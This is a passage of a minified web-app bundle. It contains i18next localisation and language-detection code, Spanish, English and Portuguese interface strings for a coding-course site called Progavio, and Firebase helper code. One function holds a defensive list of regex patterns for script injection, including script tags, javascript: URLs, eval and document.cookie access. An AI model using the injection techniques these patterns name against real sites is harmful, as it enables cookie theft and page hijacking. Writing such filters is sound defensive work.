r=="function"&&(r=Fy(r,{...this.options,...l})),f=d.keyPrefix?`${d.keyPrefix}${p}${r}`:r),this.t(f,d)};return Je(e)?i.lng=e:i.lngs=e,i.ns=t,i.keyPrefix=n,i}t(...e){return this.translator?.translate(...e)}exists(...e){return this.translator?.exists(...e)}setDefaultNamespace(e){this.options.defaultNS=e}hasLoadedNamespace(e,t={}){if(!this.isInitialized)return this.logger.warn("hasLoadedNamespace: i18next was not initialized",this.languages),!1;if(!this.languages||!this.languages.length)return this.logger.warn("hasLoadedNamespace: i18n.languages were undefined or empty",this.languages),!1;const n=t.lng||this.resolvedLanguage||this.languages[0],i=this.options?this.options.fallbackLng:!1,r=this.languages[this.languages.length-1];if(n.toLowerCase()==="cimode")return!0;const l=(u,d)=>{const p=this.services.backendConnector.state[`${u}|${d}`];return p===-1||p===0||p===2};if(t.precheck){const u=t.precheck(this,l);if(u!==void 0)return u}return!!(this.hasResourceBundle(n,e)||!this.services.backendConnector.backend||this.options.resources&&!this.options.partialBundledLanguages||l(n,e)&&(!i||l(r,e)))}loadNamespaces(e,t){const n=sd();return this.options.ns?(Je(e)&&(e=[e]),e.forEach(i=>{this.options.ns.indexOf(i)<0&&this.options.ns.push(i)}),this.loadResources(i=>{n.resolve(),t&&t(i)}),n):(t&&t(),Promise.resolve())}loadLanguages(e,t){const n=sd();Je(e)&&(e=[e]);const i=this.options.preload||[],r=e.filter(l=>i.indexOf(l)<0&&this.services.languageUtils.isSupportedCode(l));return r.length?(this.options.preload=i.concat(r),this.loadResources(l=>{n.resolve(),t&&t(l)}),n):(t&&t(),Promise.resolve())}dir(e){if(e||(e=this.resolvedLanguage||(this.languages?.length>0?this.languages[0]:this.language)),!e)return"rtl";try{const i=new Intl.Locale(e);if(i&&i.getTextInfo){const r=i.getTextInfo();if(r&&r.direction)return r.direction}}catch{}const t=["ar","shu","sqr","ssh","xaa","yhd","yud","aao","abh","abv","acm","acq","acw","acx","acy","adf","ads","aeb","aec","afb","ajp","apc","apd","arb","arq","ars","ary","arz","auz","avl","ayh","ayl","ayn","ayp","bbz","pga","he","iw","ps","pbt","pbu","pst","prp","prd","ug","ur","ydd","yds","yih","ji","yi","hbo","men","xmn","fa","jpr","peo","pes","prs","dv","sam","ckb"],n=this.services?.languageUtils||new hA(_v());return e.toLowerCase().indexOf("-latn")>1?"ltr":t.indexOf(n.getLanguagePartFromCode(e))>-1||e.toLowerCase().indexOf("-arab")>1?"rtl":"ltr"}static createInstance(e={},t){const n=new Id(e,t);return n.createInstance=Id.createInstance,n}cloneInstance(e={},t=ff){const n=e.forkResourceStore;n&&delete e.forkResourceStore;const i={...this.options,...e,isClone:!0},r=new Id(i);if((e.debug!==void 0||e.prefix!==void 0)&&(r.logger=r.logger.clone(e)),["store","services","language"].forEach(u=>{r[u]=this[u]}),r.services={...this.services},r.services.utils={hasLoadedNamespace:r.hasLoadedNamespace.bind(r)},n){const u=Object.keys(this.store.data).reduce((d,p)=>(d[p]={...this.store.data[p]},d[p]=Object.keys(d[p]).reduce((f,h)=>(f[h]={...d[p][h]},f),d[p]),d),{});r.store=new mA(u,i),r.services.resourceStore=r.store}if(e.interpolation){const d={..._v().interpolation,...this.options.interpolation,...e.interpolation},p={...i,interpolation:d};r.services.interpolator=new yA(p)}return r.translator=new sh(r.services,i),r.translator.on("*",(u,...d)=>{r.emit(u,...d)}),r.init(i,t),r.translator.options=i,r.translator.backendConnector.services.utils={hasLoadedNamespace:r.hasLoadedNamespace.bind(r)},r}toJSON(){return{options:this.options,store:this.store,language:this.language,languages:this.languages,resolvedLanguage:this.resolvedLanguage}}}const an=Id.createInstance();an.createInstance;an.dir;an.init;an.loadResources;an.reloadResources;an.use;an.changeLanguage;an.getFixedT;an.t;an.exists;an.setDefaultNamespace;an.hasLoadedNamespace;an.loadNamespaces;an.loadLanguages;const I3=(a,e,t,n)=>{const i=[t,{code:e,...n||{}}];if(a?.services?.logger?.forward)return a.services.logger.forward(i,"warn","react-i18next::",!0);tl(i[0])&&(i[0]=`react-i18next:: ${i[0]}`),a?.services?.logger?.warn?a.services.logger.warn(...i):console?.warn&&console.warn(...i)},CA={},aI=(a,e,t,n)=>{tl(t)&&CA[t]||(tl(t)&&(CA[t]=new Date),I3(a,e,t,n))},tI=(a,e)=>()=>{if(a.isInitialized)e();else{const t=()=>{setTimeout(()=>{a.off("initialized",t)},0),e()};a.on("initialized",t)}},Vy=(a,e,t)=>{a.loadNamespaces(e,tI(a,t))},TA=(a,e,t,n)=>{if(tl(t)&&(t=[t]),a.options.preload&&a.options.preload.indexOf(e)>-1)return Vy(a,t,n);t.forEach(i=>{a.options.ns.indexOf(i)<0&&a.options.ns.push(i)}),a.loadLanguages(e,tI(a,n))},w3=(a,e,t={})=>!e.languages||!e.languages.length?(aI(e,"NO_LANGUAGES","i18n.languages were undefined or empty",{languages:e.languages}),!0):e.hasLoadedNamespace(a,{lng:t.lng,precheck:(n,i)=>{if(t.bindI18n&&t.bindI18n.indexOf("languageChanging")>-1&&n.services.backendConnector.backend&&n.isLanguageChangingTo&&!i(n.isLanguageChangingTo,a))return!1}}),tl=a=>typeof a=="string",j3=a=>typeof a=="object"&&a!==null,D3=/&(?:amp|#38|lt|#60|gt|#62|apos|#39|quot|#34|nbsp|#160|copy|#169|reg|#174|hellip|#8230|#x2F|#47);/g,M3={"&amp;":"&","&#38;":"&","&lt;":"<","&#60;":"<","&gt;":">","&#62;":">","&apos;":"'","&#39;":"'","&quot;":'"',"&#34;":'"',"&nbsp;":" ","&#160;":" ","&copy;":"","&#169;":"","&reg;":"","&#174;":"","&hellip;":"","&#8230;":"","&#x2F;":"/","&#47;":"/"},N3=a=>M3[a],_3=a=>a.replace(D3,N3);let Hy={bindI18n:"languageChanged",bindI18nStore:"",transEmptyNodeValue:"",transSupportBasicHtmlNodes:!0,transWrapTextNodes:"",transKeepBasicHtmlNodesFor:["br","strong","i","p"],useSuspense:!0,unescape:_3,transDefaultProps:void 0};const q3=(a={})=>{Hy={...Hy,...a}},k3=()=>Hy;let nI;const O3=a=>{nI=a},U3=()=>nI,z3={type:"3rdParty",init(a){q3(a.options.react),O3(a)}},B3=U.createContext();class F3{constructor(){this.usedNamespaces={}}addUsedNamespaces(e){e.forEach(t=>{this.usedNamespaces[t]||(this.usedNamespaces[t]=!0)})}getUsedNamespaces(){return Object.keys(this.usedNamespaces)}}var qv={exports:{}},kv={};var xA;function V3(){if(xA)return kv;xA=1;var a=Hh();function e(h,E){return h===E&&(h!==0||1/h===1/E)||h!==h&&E!==E}var t=typeof Object.is=="function"?Object.is:e,n=a.useState,i=a.useEffect,r=a.useLayoutEffect,l=a.useDebugValue;function u(h,E){var C=E(),A=n({inst:{value:C,getSnapshot:E}}),j=A[0].inst,R=A[1];return r(function(){j.value=C,j.getSnapshot=E,d(j)&&R({inst:j})},[h,C,E]),i(function(){return d(j)&&R({inst:j}),h(function(){d(j)&&R({inst:j})})},[h]),l(C),C}function d(h){var E=h.getSnapshot;h=h.value;try{var C=E();return!t(h,C)}catch{return!0}}function p(h,E){return E()}var f=typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"?p:u;return kv.useSyncExternalStore=a.useSyncExternalStore!==void 0?a.useSyncExternalStore:f,kv}var AA;function H3(){return AA||(AA=1,qv.exports=V3()),qv.exports}var G3=H3();const Q3=(a,e)=>tl(e)?e:j3(e)&&tl(e.defaultValue)?e.defaultValue:Array.isArray(a)?a[a.length-1]:a,J3={t:Q3,ready:!1},W3=()=>()=>{},iI=(a,e={})=>{const{i18n:t}=e,{i18n:n,defaultNS:i}=U.useContext(B3)||{},r=t||n||U3();r&&!r.reportNamespaces&&(r.reportNamespaces=new F3),r||aI(r,"NO_I18NEXT_INSTANCE","useTranslation: You will need to pass in an i18next instance by using initReactI18next");const l=U.useMemo(()=>({...k3(),...r?.options?.react,...e}),[r,e]),{useSuspense:u,keyPrefix:d}=l,p=i||r?.options?.defaultNS,f=tl(p)?[p]:p||["translation"],h=U.useMemo(()=>f,f);r?.reportNamespaces?.addUsedNamespaces?.(h);const E=U.useRef(0),C=U.useCallback(N=>{if(!r)return W3;const{bindI18n:L,bindI18nStore:_}=l,V=()=>{E.current+=1,N()};return L&&r.on(L,V),_&&r.store.on(_,V),()=>{L&&L.split(" ").forEach(F=>r.off(F,V)),_&&_.split(" ").forEach(F=>r.store.off(F,V))}},[r,l]),A=U.useRef(),j=U.useCallback(()=>{if(!r)return J3;const N=!!(r.isInitialized||r.initializedStoreOnce)&&h.every(me=>w3(me,r,l)),L=e.lng||r.language,_=E.current,V=A.current;if(V&&V.ready===N&&V.lng===L&&V.keyPrefix===d&&V.revision===_)return V;const ce={t:r.getFixedT(L,l.nsMode==="fallback"?h:h[0],d),ready:N,lng:L,keyPrefix:d,revision:_};return A.current=ce,ce},[r,h,d,l,e.lng]),[R,I]=U.useState(0),{t:w,ready:k}=G3.useSyncExternalStore(C,j,j);U.useEffect(()=>{if(r&&!k&&!u){const N=()=>I(L=>L+1);e.lng?TA(r,e.lng,h,N):Vy(r,h,N)}},[r,e.lng,h,k,u,R]);const Y=r||{},ee=U.useRef(null),Q=U.useRef(),q=N=>{const L=Object.getOwnPropertyDescriptors(N);L.__original&&delete L.__original;const _=Object.create(Object.getPrototypeOf(N),L);if(!Object.prototype.hasOwnProperty.call(_,"__original"))try{Object.defineProperty(_,"__original",{value:N,writable:!1,enumerable:!1,configurable:!1})}catch{}return _},M=U.useMemo(()=>{const N=Y,L=N?.language;let _=N;N&&(ee.current&&ee.current.__original===N?Q.current!==L?(_=q(N),ee.current=_,Q.current=L):_=ee.current:(_=q(N),ee.current=_,Q.current=L));const V=[w,_,k];return V.t=w,V.i18n=_,V.ready=k,V},[w,Y,k,Y.resolvedLanguage,Y.language,Y.languages]);if(r&&u&&!k)throw new Promise(N=>{const L=()=>N();e.lng?TA(r,e.lng,h,L):Vy(r,h,L)});return M},{slice:K3,forEach:Y3}=[];function $3(a){return Y3.call(K3.call(arguments,1),e=>{if(e)for(const t in e)a[t]===void 0&&(a[t]=e[t])}),a}function X3(a){return typeof a!="string"?!1:[/<\s*script.*?>/i,/<\s*\/\s*script\s*>/i,/<\s*img.*?on\w+\s*=/i,/<\s*\w+\s*on\w+\s*=.*?>/i,/javascript\s*:/i,/vbscript\s*:/i,/expression\s*\(/i,/eval\s*\(/i,/alert\s*\(/i,/document\.cookie/i,/document\.write\s*\(/i,/window\.location/i,/innerHTML/i].some(t=>t.test(a))}const PA=/^[\u0009\u0020-\u007e\u0080-\u00ff]+$/,Z3=function(a,e){const n=arguments.length>2&&arguments[2]!==void 0?arguments[2]:{path:"/"},i=encodeURIComponent(e);let r=`${a}=${i}`;if(n.maxAge>0){const l=n.maxAge-0;if(Number.isNaN(l))throw new Error("maxAge should be a Number");r+=`; Max-Age=${Math.floor(l)}`}if(n.domain){if(!PA.test(n.domain))throw new TypeError("option domain is invalid");r+=`; Domain=${n.domain}`}if(n.path){if(!PA.test(n.path))throw new TypeError("option path is invalid");r+=`; Path=${n.path}`}if(n.expires){if(typeof n.expires.toUTCString!="function")throw new TypeError("option expires is invalid");r+=`; Expires=${n.expires.toUTCString()}`}if(n.httpOnly&&(r+="; HttpOnly"),n.secure&&(r+="; Secure"),n.sameSite)switch(typeof n.sameSite=="string"?n.sameSite.toLowerCase():n.sameSite){case!0:r+="; SameSite=Strict";break;case"lax":r+="; SameSite=Lax";break;case"strict":r+="; SameSite=Strict";break;case"none":r+="; SameSite=None";break;default:throw new TypeError("option sameSite is invalid")}return n.partitioned&&(r+="; Partitioned"),r},LA={create(a,e,t,n){let i=arguments.length>4&&arguments[4]!==void 0?arguments[4]:{path:"/",sameSite:"strict"};t&&(i.expires=new Date,i.expires.setTime(i.expires.getTime()+t*60*1e3)),n&&(i.domain=n),document.cookie=Z3(a,e,i)},read(a){const e=`${a}=`,t=document.cookie.split(";");for(let n=0;n<t.length;n++){let i=t[n];for(;i.charAt(0)===" ";)i=i.substring(1,i.length);if(i.indexOf(e)===0)return i.substring(e.length,i.length)}return null},remove(a,e){this.create(a,"",-1,e)}};var eO={name:"cookie",lookup(a){let{lookupCookie:e}=a;if(e&&typeof document<"u")return LA.read(e)||void 0},cacheUserLanguage(a,e){let{lookupCookie:t,cookieMinutes:n,cookieDomain:i,cookieOptions:r}=e;t&&typeof document<"u"&&LA.create(t,a,n,i,r)}},aO={name:"querystring",lookup(a){let{lookupQuerystring:e}=a,t;if(typeof window<"u"){let{search:n}=window.location;!window.location.search&&window.location.hash?.indexOf("?")>-1&&(n=window.location.hash.substring(window.location.hash.indexOf("?")));const r=n.substring(1).split("&");for(let l=0;l<r.length;l++){const u=r[l].indexOf("=");u>0&&r[l].substring(0,u)===e&&(t=r[l].substring(u+1))}}return t}},tO={name:"hash",lookup(a){let{lookupHash:e,lookupFromHashIndex:t}=a,n;if(typeof window<"u"){const{hash:i}=window.location;if(i&&i.length>2){const r=i.substring(1);if(e){const l=r.split("&");for(let u=0;u<l.length;u++){const d=l[u].indexOf("=");d>0&&l[u].substring(0,d)===e&&(n=l[u].substring(d+1))}}if(n)return n;if(!n&&t>-1){const l=i.match(/\/([a-zA-Z-]*)/g);return Array.isArray(l)?l[typeof t=="number"?t:0]?.replace("/",""):void 0}}}return n}};let nc=null;const RA=()=>{if(nc!==null)return nc;try{if(nc=typeof window<"u"&&window.localStorage!==null,!nc)return!1;const a="i18next.translate.boo";window.localStorage.setItem(a,"foo"),window.localStorage.removeItem(a)}catch{nc=!1}return nc};var nO={name:"localStorage",lookup(a){let{lookupLocalStorage:e}=a;if(e&&RA())return window.localStorage.getItem(e)||void 0},cacheUserLanguage(a,e){let{lookupLocalStorage:t}=e;t&&RA()&&window.localStorage.setItem(t,a)}};let ic=null;const IA=()=>{if(ic!==null)return ic;try{if(ic=typeof window<"u"&&window.sessionStorage!==null,!ic)return!1;const a="i18next.translate.boo";window.sessionStorage.setItem(a,"foo"),window.sessionStorage.removeItem(a)}catch{ic=!1}return ic};var iO={name:"sessionStorage",lookup(a){let{lookupSessionStorage:e}=a;if(e&&IA())return window.sessionStorage.getItem(e)||void 0},cacheUserLanguage(a,e){let{lookupSessionStorage:t}=e;t&&IA()&&window.sessionStorage.setItem(t,a)}},oO={name:"navigator",lookup(a){const e=[];if(typeof navigator<"u"){const{languages:t,userLanguage:n,language:i}=navigator;if(t)for(let r=0;r<t.length;r++)e.push(t[r]);n&&e.push(n),i&&e.push(i)}return e.length>0?e:void 0}},sO={name:"htmlTag",lookup(a){let{htmlTag:e}=a,t;const n=e||(typeof document<"u"?document.documentElement:null);return n&&typeof n.getAttribute=="function"&&(t=n.getAttribute("lang")),t}},rO={name:"path",lookup(a){let{lookupFromPathIndex:e}=a;if(typeof window>"u")return;const t=window.location.pathname.match(/\/([a-zA-Z-]*)/g);return Array.isArray(t)?t[typeof e=="number"?e:0]?.replace("/",""):void 0}},lO={name:"subdomain",lookup(a){let{lookupFromSubdomainIndex:e}=a;const t=typeof e=="number"?e+1:1,n=typeof window<"u"&&window.location?.hostname?.match(/^(\w{2,5})\.(([a-z0-9-]{1,63}\.[a-z]{2,6})|localhost)/i);if(n)return n[t]}};let oI=!1;try{document.cookie,oI=!0}catch{}const sI=["querystring","cookie","localStorage","sessionStorage","navigator","htmlTag"];oI||sI.splice(1,1);const cO=()=>({order:sI,lookupQuerystring:"lng",lookupCookie:"i18next",lookupLocalStorage:"i18nextLng",lookupSessionStorage:"i18nextLng",caches:["localStorage"],excludeCacheFor:["cimode"],convertDetectedLanguage:a=>a});class rI{constructor(e){let t=arguments.length>1&&arguments[1]!==void 0?arguments[1]:{};this.type="languageDetector",this.detectors={},this.init(e,t)}init(){let e=arguments.length>0&&arguments[0]!==void 0?arguments[0]:{languageUtils:{}},t=arguments.length>1&&arguments[1]!==void 0?arguments[1]:{},n=arguments.length>2&&arguments[2]!==void 0?arguments[2]:{};this.services=e,this.options=$3(t,this.options||{},cO()),typeof this.options.convertDetectedLanguage=="string"&&this.options.convertDetectedLanguage.indexOf("15897")>-1&&(this.options.convertDetectedLanguage=i=>i.replace("-","_")),this.options.lookupFromUrlIndex&&(this.options.lookupFromPathIndex=this.options.lookupFromUrlIndex),this.i18nOptions=n,this.addDetector(eO),this.addDetector(aO),this.addDetector(nO),this.addDetector(iO),this.addDetector(oO),this.addDetector(sO),this.addDetector(rO),this.addDetector(lO),this.addDetector(tO)}addDetector(e){return this.detectors[e.name]=e,this}detect(){let e=arguments.length>0&&arguments[0]!==void 0?arguments[0]:this.options.order,t=[];return e.forEach(n=>{if(this.detectors[n]){let i=this.detectors[n].lookup(this.options);i&&typeof i=="string"&&(i=[i]),i&&(t=t.concat(i))}}),t=t.filter(n=>n!=null&&!X3(n)).map(n=>this.options.convertDetectedLanguage(n)),this.services&&this.services.languageUtils&&this.services.languageUtils.getBestMatchFromCodes?t:t.length>0?t[0]:null}cacheUserLanguage(e){let t=arguments.length>1&&arguments[1]!==void 0?arguments[1]:this.options.caches;t&&(this.options.excludeCacheFor&&this.options.excludeCacheFor.indexOf(e)>-1||t.forEach(n=>{this.detectors[n]&&this.detectors[n].cacheUserLanguage(e,this.options)}))}}rI.type="languageDetector";const uO={title:"Domina el cdigo con Progavio",description:"Tu camino desde los fundamentos hasta el nivel avanzado en el desarrollo de software. Aprende paso a paso con una estructura clara y mucha prctica.",start_path:"Comenzar Cursos",view_profile:"Ver mi Perfil",download_app:"Descargar App",update_available:"Nueva versin disponible! Por favor actualiza a la versin ",footer_rights:" 2025 Progavio. Todos los derechos reservados.",created_by:"Creado por"},dO={home:"Inicio",roadmap:"Cursos",libraries:"Libreras",cheatsheets:"Trucos",projects:"Proyectos",playground:"<div />",admin:"Admin",profile:"Perfil",logout:"Salir",login:"Entrar"},pO={modules_title:"Cursos",modules_desc:"Aqui se encuentran los distintos modulos de aprendizaje.",libs_title:"Librerias",libs_desc:"Recursos y herramientas recomendadas listas para integrar en tus proyectos reales.",tricks_title:"Trucos / Cheatsheets",tricks_desc:"Refrescar la memoria y conceptos.",playground_title:"DIV",playground_desc:"Este espacio es para experimentar con flexbox (CSS). Podras obtener el codigo de las cajas. Tambien encontraras plantillas para tus proyectos.",video_title:"Conoce Progavio"},mO={common:uO,nav:dO,home:pO},fO={title:"Master Code with Progavio",description:"Your path from fundamentals to advanced level in software development. Learn step by step with a clear structure and plenty of practice.",start_path:"Start Path",view_profile:"View Profile",download_app:"Download Android App",update_available:"New version available! Please update to version ",footer_rights:" 2025 Progavio Inc. All rights reserved.",created_by:"Created by"},hO={home:"Home",roadmap:"Modules",libraries:"Libraries",cheatsheets:"Cheatsheets",projects:"Projects",playground:"<div />",admin:"Admin",profile:"Profile",logout:"Logout",login:"Login"},gO={modules_title:"Modules",modules_desc:"Step-by-step learning structure divided by levels: Junior, Semi-Senior, and Senior.",libs_title:"Libraries",libs_desc:"Recommended resources and tools ready to integrate into your real-world projects.",tricks_title:"Tricks and Cheatsheets",tricks_desc:"Quick guides and visual shortcuts to master concepts and code faster.",playground_title:"<div /> Playground",playground_desc:"Interactive space to experiment with code and see results in real-time.",video_title:"Discover Progavio"},bO={common:fO,nav:hO,home:gO},vO={title:"Domine o cdigo com Progavio",description:"Seu caminho desde os fundamentos at o nvel avanado no desenvolvimento de software. Aprenda passo a passo com uma estrutura clara e muita prtica.",start_path:"Comear Rota",view_profile:"Ver Meu Perfil",download_app:"Baixar App Android",update_available:"Nova verso disponvel! Por favor, atualize para a verso ",footer_rights:" 2025 Progavio Inc. Todos os direitos reservados.",created_by:"Criado por"},yO={home:"Incio",roadmap:"Mdulos",libraries:"Librerias",cheatsheets:"Dicas",projects:"Projetos",playground:"<div />",admin:"Admin",profile:"Perfil",logout:"Sair",login:"Entrar"},EO={modules_title:"Mdulos",modules_desc:"Estrutura de aprendizagem passo a passo dividida por nveis: Junior, Semi-Senior e Senior.",libs_title:"Librerias",libs_desc:"Recursos e ferramentas recomendadas prontas para integrar em seus projetos reais.",tricks_title:"Dicas e Cheatsheets",tricks_desc:"Guias rpidos e atalhos visuais para dominar conceitos e programar mais rpido.",playground_title:"<div /> Playground",playground_desc:"Espao interativo para experimentar com cdigo e ver os resultados em tempo real.",video_title:"Conhea o Progavio"},SO={common:vO,nav:yO,home:EO},CO={es:{translation:mO},en:{translation:bO},pt:{translation:SO}};an.use(rI).use(z3).init({resources:CO,fallbackLng:"es",interpolation:{escapeValue:!1}});const TO=()=>{};var wA={};const lI=function(a){const e=[];let t=0;for(let n=0;n<a.length;n++){let i=a.charCodeAt(n);i<128?e[t++]=i:i<2048?(e[t++]=i>>6|192,e[t++]=i&63|128):(i&64512)===55296&&n+1<a.length&&(a.charCodeAt(n+1)&64512)===56320?(i=65536+((i&1023)<<10)+(a.charCodeAt(++n)&1023),e[t++]=i>>18|240,e[t++]=i>>12&63|128,e[t++]=i>>6&63|128,e[t++]=i&63|128):(e[t++]=i>>12|224,e[t++]=i>>6&63|128,e[t++]=i&63|128)}return e},xO=function(a){const e=[];let t=0,n=0;for(;t<a.length;){const i=a[t++];if(i<128)e[n++]=String.fromCharCode(i);else if(i>191&&i<224){const r=a[t++];e[n++]=String.fromCharCode((i&31)<<6|r&63)}else if(i>239&&i<365){const r=a[t++],l=a[t++],u=a[t++],d=((i&7)<<18|(r&63)<<12|(l&63)<<6|u&63)-65536;e[n++]=String.fromCharCode(55296+(d>>10)),e[n++]=String.fromCharCode(56320+(d&1023))}else{const r=a[t++],l=a[t++];e[n++]=String.fromCharCode((i&15)<<12|(r&63)<<6|l&63)}}return e.join("")},cI={byteToCharMap_:null,charToByteMap_:null,byteToCharMapWebSafe_:null,charToByteMapWebSafe_:null,ENCODED_VALS_BASE:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",get ENCODED_VALS(){return this.ENCODED_VALS_BASE+"+/="},get ENCODED_VALS_WEBSAFE(){return this.ENCODED_VALS_BASE+"-_."},HAS_NATIVE_SUPPORT:typeof atob=="function",encodeByteArray(a,e){if(!Array.isArray(a))throw Error("encodeByteArray takes an array as a parameter");this.init_();const t=e?this.byteToCharMapWebSafe_:this.byteToCharMap_,n=[];for(let i=0;i<a.length;i+=3){const r=a[i],l=i+1<a.length,u=l?a[i+1]:0,d=i+2<a.length,p=d?a[i+2]:0,f=r>>2,h=(r&3)<<4|u>>4;let E=(u&15)<<2|p>>6,C=p&63;d||(C=64,l||(E=64)),n.push(t[f],t[h],t[E],t[C])}return n.join("")},encodeString(a,e){return this.HAS_NATIVE_SUPPORT&&!e?btoa(a):this.encodeByteArray(lI(a),e)},decodeString(a,e){return this.HAS_NATIVE_SUPPORT&&!e?atob(a):xO(this.decodeStringToByteArray(a,e))},decodeStringToByteArray(a,e){this.init_();const t=e?this.charToByteMapWebSafe_:this.charToByteMap_,n=[];for(let i=0;i<a.length;){const r=t[a.charAt(i++)],u=i<a.length?t[a.charAt(i)]:0;++i;const p=i<a.length?t[a.charAt(i)]:64;++i;const h=i<a.length?t[a.charAt(i)]:64;if(++i,r==null||u==null||p==null||h==null)throw new AO;const E=r<<2|u>>4;if(n.push(E),p!==64){const C=u<<4&240|p>>2;if(n.push(C),h!==64){const A=p<<6&192|h;n.push(A)}}}return n},init_(){if(!this.byteToCharMap_){this.byteToCharMap_={},this.charToByteMap_={},this.byteToCharMapWebSafe_={},this.charToByteMapWebSafe_={};for(let a=0;a<this.ENCODED_VALS.length;a++)this.byteToCharMap_[a]=this.ENCODED_VALS.charAt(a),this.charToByteMap_[this.byteToCharMap_[a]]=a,this.byteToCharMapWebSafe_[a]=this.ENCODED_VALS_WEBSAFE.charAt(a),this.charToByteMapWebSafe_[this.byteToCharMapWebSafe_[a]]=a,a>=this.ENCODED_VALS_BASE.length&&(this.charToByteMap_[this.ENCODED_VALS_WEBSAFE.charAt(a)]=a,this.charToByteMapWebSafe_[this.ENCODED_VALS.charAt(a)]=a)}}};class AO extends Error{constructor(){super(...arguments),this.name="DecodeBase64StringError"}}const PO=function(a){const e=lI(a);return cI.encodeByteArray(e,!0)},rh=function(a){return PO(a).replace(/\./g,"")},uI=function(a){try{return cI.decodeString(a,!0)}catch(e){console.error("base64Decode failed: ",e)}return null};function LO(){if(typeof self<"u")return self;if(typeof window<"u")return window;if(typeof global<"u")return global;throw new Error("Unable to locate global object.")}const RO=()=>LO().__FIREBASE_DEFAULTS__,IO=()=>{if(typeof process>"u"||typeof wA>"u")return;const a=wA.__FIREBASE_DEFAULTS__;if(a)return JSON.parse(a)},wO=()=>{if(typeof document>"u")return;let a;try{a=document.cookie.match(/__FIREBASE_DEFAULTS__=([^;]+)/)}catch{return}const e=a&&uI(a[1]);return e&&JSON.parse(e)},Qh=()=>{try{return TO()||RO()||IO()||wO()}catch(a){console.info(`Unable to get __FIREBASE_DEFAULTS__ due to: ${a}`);return}},dI=a=>Qh()?.emulatorHosts?.[a],jO=a=>{const e=dI(a);if(!e)return;const t=e.lastIndexOf(":");if(t<=0||t+1===e.length)throw new Error(`Invalid host ${e} with no separate hostname and port!`);const n=parseInt(e.substring(t+1),10);return e[0]==="["?[e.substring(1,t-1),n]:[e.substring(0,t),n]},pI=()=>Qh()?.config,mI=a=>Qh()?.[`_${a}`];class DO{constructor(){this.reject=()=>{},this.resolve=()=>{},this.promise=new Promise((e,t)=>{this.resolve=e,this.reject=t})}wrapCallback(e){return(t,n)=>{t?this.reject(t):this.resolve(n),typeof e=="function"&&(this.promise.catch(()=>{}),e.length===1?e(t):e(t,n))}}}function zc(a){try{return(a.startsWith("http://")||a.startsWith("https://")?new URL(a).hostname:a).endsWith(".cloudworkstations.dev")}catch{return!1}}async function fI(a){return(await fetch(a,{credentials:"include"})).ok}function MO(a,e){if(a.uid)throw new Error('The "uid" field is no longer supported by mockUserToken. Please use "sub" instead for Firebase Auth User ID.');const t={alg:"none",type:"JWT"},n=e||"demo-project",i=a.iat||0,r=a.sub||a.user_id;if(!r)throw new Error("mockUserToken must contain 'sub' or 'user_id' field!");const l={iss:`https://securetoken.google.com/${n}`,aud:n,iat:i,exp:i+3600,auth_time:i,sub:r,user_id:r,firebase:{sign_in_provider:"custom",identities:{}},...a};return[rh(JSON.stringify(t)),rh(JSON.stringify(l)),""].join(".")}const wd={};function NO(){const a={prod:[],emulator:[]};for(const e of Object.keys(wd))wd[e]?a.emulator.push(e):a.prod.push(e);return a}function _O(a){let e=document.getElementById(a),t=!1;return e||(e=document.createElement("div"),e.setAttribute("id",a),t=!0),{created:t,element:e}}let jA=!1;function hI(a,e){if(typeof window>"u"||typeof document>"u"||!zc(window.location.host)||wd[a]===e||wd[a]||jA)return;wd[a]=e;function t(E){return`__firebase__banner__${E}`}const n="__firebase__banner",r=NO().prod.length>0;function l(){const E=document.getElementById(n);E&&E.remove()}function u(E){E.style.display="flex",E.style.background="#7faaf0",E.style.position="fixed",E.style.bottom="5px",E.style.left="5px",E.style.padding=".5em",E.style.borderRadius="5px",E.style.alignItems="center"}function d(E,C){E.setAttribute("width","24"),E.setAttribute("id",C),E.setAttribute("height","24"),E.setAttribute("viewBox","0 0 24 24"),E.setAttribute("fill","none"),E.style.marginLeft="-6px"}function p(){const E=document.createElement("span");return E.style.cursor="pointer",E.style.marginLeft="16px",E.style.fontSize="24px",E.innerHTML=" &times;",E.onclick=()=>{jA=!0,l()},E}function f(E,C){E.setAttribute("id",C),E.innerText="Learn more",E.href="https://firebase.google.com/docs/studio/preview-apps#preview-backend",E.setAttribute("target","__blank"),E.style.paddingLeft="5px",E.style.textDecoration="underline"}function h(){const E=_O(n),C=t("text"),A=document.getElementById(C)||document.createElement("span"),j=t("learnmore"),R=document.getElementById(j)||document.createElement("a"),I=t("preprendIcon"),w=document.getElementById(I)||document.createElementNS("http://www.w3.org/2000/svg","svg");if(E.created){const k=E.element;u(k),f(R,j);const Y=p();d(w,I),k.append(w,A,R,Y),document.body.appendChild(k)}r?(A.innerText="Preview backend disconnected.",w.innerHTML=`<g clip-path="url(#clip0_6013_33858)">
<path d="M4.8 17.6L12 5.6L19.2 17.6H4.8ZM6.91667 16.4H17.0833L12 7.93333L6.91667 16.4ZM12 15.6C12.1667 15.6 12.3056 15.5444 12.4167 15.4333C12.5389 15.3111 12.6 15.1667 12.6 15C12.6 14.8333 12.5389 14.6944 12.4167 14.5833C12.3056 14.4611 12.1667 14.4 12 14.4C11.8333 14.4 11.6889 14.4611 11.5667 14.5833C11.4556 14.6944 11.4 14.8333 11.4 15C11.4 15.1667 11.4556 15.3111 11.5667 15.4333C11.6889 15.5444 11.8333 15.6 12 15.6ZM11.4 13.6H12.6V10.4H11.4V13.6Z" fill="#212121"/>
</g>
<defs>
<clipPath id="clip0_6013_33858">
<rect width="24" height="24" fill="white"/>
</clipPath>
</defs>`):(w.innerHTML=`<g clip-path="url(#clip0_6083_34804)">
